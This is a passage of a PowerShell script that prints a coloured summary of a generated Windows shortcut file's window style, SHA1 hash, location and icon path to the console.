Write-Host "Shortcut WindowStyle  : '" -NoNewline
Write-Host "$ShortcutWindowStyle" -ForegroundColor $HiddenColor -NoNewline
Write-Host "'"

Write-Host "   - " -ForegroundColor Green -NoNewline
Write-Host "Shortcut LNK SHA      : '" -NoNewline
Write-Host "$SHA1" -ForegroundColor DarkYellow -NoNewline
Write-Host "'"

Write-Host "   - " -ForegroundColor Green -NoNewline
Write-Host "Shortcut Location     : '" -NoNewline
Write-Host "$FinalName" -ForegroundColor Green -NoNewline
Write-Host "'"

Write-Host "   - " -ForegroundColor Green -NoNewline
Write-Host "Shortcut Icon File    : '" -NoNewline
Write-Host "$global:LNKIcon" -ForegroundColor Green -NoNewline
Write-Host "'`n"